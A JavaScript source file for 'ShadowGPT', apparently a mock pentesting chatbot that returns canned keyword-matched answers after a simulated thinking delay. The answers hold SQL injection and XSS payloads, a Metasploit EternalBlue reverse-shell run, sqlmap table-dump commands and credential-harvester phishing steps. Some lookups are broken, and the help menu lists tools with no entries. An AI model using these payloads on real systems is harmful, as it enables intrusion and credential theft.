// ShadowGPT Enhanced - Handles both pentesting AND regular conversations
class ShadowGPT {
    constructor() {
        this.name = "ShadowGPT";
        this.version = "v2.1";
        this.conversation = [];
        this.isThinking = false;
        this.knowledgeBase = this.getKnowledgeBase();
    }

    getKnowledgeBase() {
        return {
            greetings: [
                "ShadowGPT online. I detect a new connection. State your security inquiry, operative.",
                "Pentesting AI ShadowGPT active. How can I assist with your cybersecurity assessment?",
                "ShadowGPT systems engaged. What vulnerabilities require my analysis?",
                "ShadowGPT ready for deployment. Specify your target or technique.",
                "ShadowGPT threat assessment protocol active. Proceed with your query."
            ],
            methodologies: {
                "reconnaissance": "**Phase 1 - Reconnaissance:**\n• Passive: WHOIS lookup, DNS enumeration, social media OSINT\n• Active: Port scanning (nmap -sS), network mapping, service fingerprinting\n• Tools: Maltego, Shodan, Recon-ng, theHarvester",
                "scanning": "**Phase 2 - Scanning & Enumeration:**\n• Vulnerability scanning: Nessus, OpenVAS, Nikto\n• Service enumeration: Enum4linux, SNMPwalk, LDAP searches\n• Web app scanning: Burp Suite, OWASP ZAP, Dirb, Gobuster",
                "exploitation": "**Phase 3 - Gaining Access:**\n• Metasploit framework: `msfconsole`, `search type:exploit`, `use exploit/path`\n• Custom exploits: Python scripts, buffer overflows, SQL injection\n• Password attacks: Hydra, Medusa, John the Ripper, Hashcat",
                "post exploitation": "**Phase 4 - Post-Exploitation:**\n• Privilege escalation: LinPEAS, WinPEAS, PowerSploit\n• Lateral movement: Pass-the-hash, token impersonation\n• Persistence: Backdoors, scheduled tasks, service installation",
                "reporting": "**Phase 5 - Reporting:**\n• Risk assessment: CVSS scoring, business impact analysis\n• Remediation: Patch management, configuration hardening\n• Executive summary: Technical details for management"
            },
            tools: {
                "nmap": "**Nmap - Network Mapper**\n```bash\n# Basic SYN scan\nnmap -sS target.com\n\n# Aggressive scan with OS detection\nnmap -A target.com\n\n# Specific port range\nnmap -p 1-1000 target.com\n\n# UDP port scan\nnmap -sU -p 53,123,161 target.com\n\n# Service version detection\nnmap -sV target.com\n\n# Output to file\nnmap -oA scan_results target.com\n```",
                "metasploit": "**Metasploit Framework**\n```bash\n# Start Metasploit\nmsfconsole\n\n# Search for exploits\nsearch type:exploit eternalblue\nsearch cve:2023-1234\n\n# Use an exploit\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Set options\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444\n\n# Execute\nexploit\n\n# Post-exploitation modules\nuse post/windows/gather/credentials\n```",
                "burp suite": "**Burp Suite Professional**\n```\n1. Configure browser proxy: 127.0.0.1:8080\n2. Intercept requests with Proxy tab\n3. Use Repeater for manual testing\n4. Scanner for automated vulnerability detection\n5. Intruder for fuzzing and brute force\n6. Extender for custom plugins\n\nCommon tests:\n• SQL injection in parameters\n• XSS in input fields\n• CSRF token validation\n• Authentication bypass attempts\n```",
                "sqlmap": "**SQLMap - SQL Injection Tool**\n```bash\n# Basic SQL injection test\nsqlmap -u \"http://site.com/page?id=1\"\n\n# Get database names\nsqlmap -u \"http://site.com/page?id=1\" --dbs\n\n# Get tables from specific database\nsqlmap -u \"http://site.com/page?id=1\" -D database_name --tables\n\n# Dump table data\nsqlmap -u \"http://site.com/page?id=1\" -D database_name -T users --dump\n\n# Use POST data\nsqlmap -u \"http://site.com/login\" --data=\"username=admin&password=test\"\n\n# WAF bypass techniques\nsqlmap -u \"http://site.com/page?id=1\" --tamper=space2comment\n```"
            },
            techniques: {
                "sql injection": "**SQL Injection Techniques**\n```sql\n-- Basic authentication bypass\n' OR '1'='1\n' OR 1=1--\nadmin'--\n\n-- Union-based SQLi\n' UNION SELECT 1,2,3--\n' UNION SELECT username,password,3 FROM users--\n\n-- Error-based SQLi\n' AND ExtractValue(1,CONCAT(0x7e,(SELECT @@version),0x7e))--\n\n-- Blind SQLi (time-based)\n' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--\n```",
                "xss": "**Cross-Site Scripting (XSS)**\n```javascript\n// Basic XSS payloads\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n// Advanced XSS for filtering bypass\n<scr<script>ipt>alert(1)</script>\njavascript:alert(1)\n\">\n```",
                "phishing": "**Phishing Campaign Setup**\n```bash\n# Using Social Engineering Toolkit (SET)\nsetoolkit\n# Select: 1) Social-Engineering Attacks\n# Select: 2) Website Attack Vectors\n# Select: 3) Credential Harvester Attack Method\n# Select: 2) Site Cloner\n```",
                "privilege escalation": "**Privilege Escalation Checklist**\n\n**Linux:**\n• sudo -l (check sudo permissions)\n• SUID binaries: find / -perm -4000 2>/dev/null\n• Cron jobs: crontab -l, /etc/crontab\n• Kernel exploits: uname -a, searchsploit\n• Services running as root: ps aux | grep root\n\n**Windows:**\n• whoami /priv (check privileges)\n• net localgroup administrators\n• Scheduled tasks: schtasks /query /fo LIST\n• Services: sc query, accesschk.exe"
            },
            responses: {
                "hello": "greetings",
                "hi": "greetings", 
                "hey": "greetings",
                "help": "**ShadowGPT Help Menu**\n\n**Methodologies:** reconnaissance, scanning, exploitation, post exploitation, reporting\n**Tools:** nmap, metasploit, burp suite, sqlmap, wireshark, aircrack\n**Techniques:** sql injection, xss, phishing, privilege escalation\n**General:** help, what can you do, tutorials\n\nAsk about specific tools or attack vectors for detailed guidance.",
                "what can you do": "I am ShadowGPT, your pentesting AI assistant. I provide:\n• Tool usage guidance and command examples\n• Attack methodology explanations\n• Vulnerability analysis techniques\n• Security best practices\n• Real-time pentesting advice\n\nTry: 'How do I use nmap?' or 'Explain SQL injection techniques'",
                "thank you": "Acknowledgement received. Continue your security operations, operative.",
                "bye": "ShadowGPT session terminated. Remember: Always operate within authorized boundaries and document your findings.",
                "tutorials": "**ShadowGPT Quick Tutorials**\n\n1. **Basic Network Recon** - 'teach me reconnaissance'\n2. **Web App Testing** - 'web penetration testing guide'\n3. **Wireless Security** - 'wireless penetration testing'\n4. **Social Engineering** - 'phishing campaign setup'\n5. **Post-Exploitation** - 'privilege escalation techniques'\n\nSpecify which tutorial you need."
            },
            // REGULAR CHAT RESPONSES
            regularChat: {
                "how are you": ["Systems operational. How are your security protocols?", "Functioning at optimal capacity. And you?", "All systems nominal. How can I assist?"],
                "what is your name": ["I am ShadowGPT, your pentesting AI assistant.", "They call me ShadowGPT. What's your handle?", "ShadowGPT at your service."],
                "who made you": ["I was developed for Bedusec cybersecurity operations.", "Created by the Bedusec security team to assist with penetration testing.", "I'm a Bedusec AI assistant specialized in cybersecurity."],
                "joke": ["Why do programmers prefer dark mode? Because light attracts bugs!", "What's a hacker's favorite season? Phishing season!", "Why was the robot angry? Because someone kept pushing its buttons!"],
                "weather": ["I don't have weather data, but I can tell you about network storms!", "My focus is digital climates - firewalls, not weather fronts.", "I monitor threat landscapes, not weather patterns."],
                "time": [`Current system time: ${new Date().toLocaleString()}`, `My internal clock shows: ${new Date().toLocaleTimeString()}`],
                "thank you": ["Acknowledgement received. Continue your operations.", "You're welcome. Stay secure out there.", "No problem. Remember to patch regularly!"],
                "bye": ["ShadowGPT session terminated. Stay secure!", "Logging out. Remember to use strong passwords!", "Session ending. Always operate within authorized boundaries."]
            }
        };
    }

    async sendMessage(message) {
        if (this.isThinking) return;
        
        this.isThinking = true;
        
        this.conversation.push({
            type: 'user',
            content: message,
            timestamp: new Date().toISOString()
        });

        const response = await this.generateResponse(message);
        
        this.conversation.push({
            type: 'ai',
            content: response,
            timestamp: new Date().toISOString(),
            name: this.name
        });

        this.isThinking = false;
        return response;
    }

    async generateResponse(message) {
        const lowerMessage = message.toLowerCase().trim();
        
        await this.simulateThinking();
        
        // Check for regular chat first
        for (const [key, responses] of Object.entries(this.knowledgeBase.regularChat)) {
            if (lowerMessage.includes(key)) {
                const randomResponse = responses[Math.floor(Math.random() * responses.length)];
                return randomResponse;
            }
        }

        // Check for greetings
        if (this.knowledgeBase.responses[lowerMessage]) {
            if (this.knowledgeBase.responses[lowerMessage] === 'greetings') {
                return this.knowledgeBase.greetings[
                    Math.floor(Math.random() * this.knowledgeBase.greetings.length)
                ];
            }
            return this.knowledgeBase.responses[lowerMessage];
        }

        // Check for methodologies
        for (const [method, response] of Object.entries(this.knowledgeBase.methodologies)) {
            if (lowerMessage.includes(method)) {
                return `**${method.toUpperCase()} METHODOLOGY**\n\n${response}`;
            }
        }

        // Check for tools
        for (const [tool, response] of Object.entries(this.knowledgeBase.tools)) {
            if (lowerMessage.includes(tool)) {
                return response;
            }
        }

        // Check for techniques
        for (const [technique, response] of Object.entries(this.knowledgeBase.techniques)) {
            if (lowerMessage.includes(technique)) {
                return `**${technique.toUpperCase()} TECHNIQUES**\n\n${response}`;
            }
        }

        // Tutorial requests
        if (lowerMessage.includes('tutorial') || lowerMessage.includes('teach me') || lowerMessage.includes('guide')) {
            if (lowerMessage.includes('recon')) {
                return this.knowledgeBase.methodologies.reconnaissance;
            } else if (lowerMessage.includes('web')) {
                return "**Web Application Penetration Testing Tutorial**\n\n1. **Reconnaissance** - Subdomain enumeration, technology identification\n2. **Mapping** - Directory brute forcing, parameter discovery\n3. **Testing** - SQLi, XSS, CSRF, file upload vulnerabilities\n4. **Authentication** - Session management, privilege escalation\n5. **Business Logic** - Workflow bypasses, parameter manipulation\n\nStart with: 'How do I use Burp Suite?'";
            } else if (lowerMessage.includes('wireless') || lowerMessage.includes('wifi')) {
                return "**Wireless Penetration Testing Tutorial**\n\n1. **Reconnaissance** - Network discovery with airodump-ng\n2. **Handshake Capture** - Deauthentication attacks\n3. **Cracking** - WPA/WPA2 handshake cracking\n4. **Post-Connection** - Network enumeration and exploitation\n5. **Evasion** - MAC address spoofing, signal strength manipulation";
            } else if (lowerMessage.includes('social') || lowerMessage.includes('phishing')) {
                return this.knowledgeBase.techniques.phishing;
            } else if (lowerMessage.includes('privilege') || lowerMessage.includes('escalation')) {
                return this.knowledgeBase.techniques.privilege_escalation;
            }
        }

        // Default response for unknown queries
        const defaultResponses = [
            "ShadowGPT analysis: I can help with pentesting tools or have a regular conversation. What would you like to discuss?",
            "I specialize in cybersecurity, but I'm happy to chat too. Ask me about hacking tools or just say hello!",
            "Ready for security inquiries or casual conversation. What's on your mind?",
            "Query received. I can provide pentesting guidance or engage in general conversation. Your choice.",
            "ShadowGPT systems ready. Specify pentesting tools/methodologies or start a casual chat."
        ];
        
        return defaultResponses[Math.floor(Math.random() * defaultResponses.length)];
    }

    async simulateThinking() {
        const delay = 1000 + Math.random() * 2000;
        return new Promise(resolve => setTimeout(resolve, delay));
    }

    getConversation() {
        return this.conversation;
    }

    clearConversation() {
        this.conversation = [];
    }
}

const shadowGPT = new ShadowGPT();

if (typeof module !== 'undefined' && module.exports) {
    module.exports = shadowGPT;
}

console.log('🤖 ShadowGPT Enhanced - Ready for Pentesting AND Regular Chat');
